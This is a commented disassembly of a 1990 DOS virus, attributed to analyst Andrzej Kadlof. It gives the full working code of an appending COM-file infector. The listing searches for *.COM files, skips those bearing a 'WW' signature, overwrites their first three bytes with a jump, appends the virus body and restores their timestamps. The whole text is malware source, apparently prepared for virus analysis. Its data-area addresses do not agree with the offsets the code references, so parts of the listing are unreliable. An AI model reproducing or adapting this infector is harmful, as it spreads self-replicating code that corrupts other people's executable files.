﻿

; new virus obtained from Marek Filipiak 1990-10-05
;
; dissasembled by Andrzej Kadlof
;

  0100 E90200         jmp    0105                        

; 0103 00F0           add    al,dh                        

;=========================
; virus main entry point

  0105 E8BC00         call   01C4     ; set SI to start of virus code

  0108 56             push   si                           

; restore main COM file

  0109 81C6D201       add    si,01D2  ; 3 oryginal bytes of victim
  010D BF0001         mov    di,0100                      
  0110 B90300         mov    cx,0003                      
  0113 F3A4           rep movsb                           

  0115 5E             pop    si                           
  0116 B44E           mov    ah,4E    ; find first                    
  0118 BAC901         mov    dx,01C9  ; address of *.COM,0 in virus
  011B 01F2           add    dx,si    ; in memory
  011D B9FFFF         mov    cx,FFFF  ; all posible atributes                    
  0120 CD21           int    21                           

  0122 723D           jb     0161     ; no more files, return to main file

  0124 52             push   dx                           
  0125 B8023D         mov    ax,3D02  ; open file for read write
  0128 BA9E00         mov    dx,009E  ; DS:DX ASCIIZ file name                    
  012B CD21           int    21                           

  012D 722B           jb     015A     ; error

  012F 8BD8           mov    bx,ax    ; store file handle
  0131 8B0E9C00       mov    cx,[009C]   ; file length in DTA                 
  0135 8B169A00       mov    dx,[009A]                    
  0139 83EA02         sub    dx,0002  ; move file pointer back two bytes                  
  013C B80142         mov    ax,4201                      
  013F CD21           int    21                           

  0141 BAD501         mov    dx,01D5  ; buffer in virus body                   
  0144 01F2           add    dx,si    ; in memory                    
  0146 B90200         mov    cx,0002  ; number of bytes                    
  0149 B43F           mov    ah,3F    ; read file                    
  014B CD21           int    21                           

  014D 8B84D501       mov    ax,[si+01D5] ; readed 2 bytes                
  0151 3D5757         cmp    ax,5757  ; WW virus sygnature                    
  0154 7510           jne    0166     ; file not infected                    

  0156 B43E           mov    ah,3E    ; close file                    
  0158 CD21           int    21                           

  015A 5A             pop    dx       ; restore DTA                    
  015B B44F           mov    ah,4F    ; find next                    
  015D CD21           int    21                           

  015F 73C3           jnb    0124     ; check file

; return to main file

  0161 BB0001         mov    bx,0100                      
  0164 FFE3           jmp    bx                           

;---------------
; infect file

  0166 A19A00         mov    ax,[009A] ; file length
  0169 2D0300         sub    ax,0003   ; starting adres in infected file                   
  016C 8984D001       mov    [si+01D0],ax ; form JMP nnnn instruction
  0170 E83E00         call   01B1      ; move file pointer at the beginning                   

  0173 BAD201         mov    dx,01D2   ; buffer for first 3 bytes of victim                  
  0176 01F2           add    dx,si     ; in memory                   
  0178 B90300         mov    cx,0003   ; number of bytes                   
  017B B43F           mov    ah,3F     ; read file                   
  017D CD21           int    21                           

  017F E82F00         call   01B1      ; move file pointer at the begining                   

  0182 BACF01         mov    dx,01CF   ; address of new starting bytes                  
  0185 01F2           add    dx,si     ; in memory                   
  0187 B90300         mov    cx,0003   ; number of bytes                   
  018A B440           mov    ah,40     ; write to file                   
  018C CD21           int    21                           

  018E E82500         call   01B6      ; move file pointer at the end of file                   

  0191 8BD6           mov    dx,si                        
  0193 81C20001       add    dx,0100   ; virus code in memory
  0197 B9D900         mov    cx,00D9   ; virus length                   
  019A B440           mov    ah,40     ; write to file                   
  019C CD21           int    21                           

  019E B80157         mov    ax,5701   ; set time/date file stamp                   
  01A1 8B0E9600       mov    cx,[0096] ; restore from DTA                   
  01A5 8B169800       mov    dx,[0098]                    
  01A9 CD21           int    21                           

  01AB B43E           mov    ah,3E     ; close file                   
  01AD CD21           int    21                           

  01AF EBB0           jmp    0161      ; jump to main file                   

;-------------------------------------------------
; move file pointer to the beginning of the file

  01B1 B000           mov    al,00                        
  01B3 EB06           jmp    01BB                         
  01B5 90             nop                                 

;--------------------------------------
; move file pointer to the end of file

  01B6 B002           mov    al,02                        
  01B8 EB01           jmp    01BB                         
  01BA 90             nop                                 

  01BB B442           mov    ah,42                        
  01BD 31C9           xor    cx,cx                        
  01BF 31D2           xor    dx,dx                        
  01C1 CD21           int    21                           

  01C3 C3             ret                                 

;----------------------------------------------------
; find address of first byte of virus code in memory

  01C4 8BEC           mov    bp,sp                        
  01C6 8B7600         mov    si,[bp]                      
  01C9 81EE0301       sub    si,0103                      
  01CD C3             ret                                 

;----------------
; working area

  01CE 2A 2E 43 4F 4D 00   ;  *.COM, 0    
  01D4 E9 02 00    ; new first 3 bytes for victim
  01D7 EA F0 FF    ; oryginal first 3 byte of victim
  01DA 00 F0       ; buffer for last 2 bytes of inspected file
  01DC 57 57       ; virus sygnature WW
    

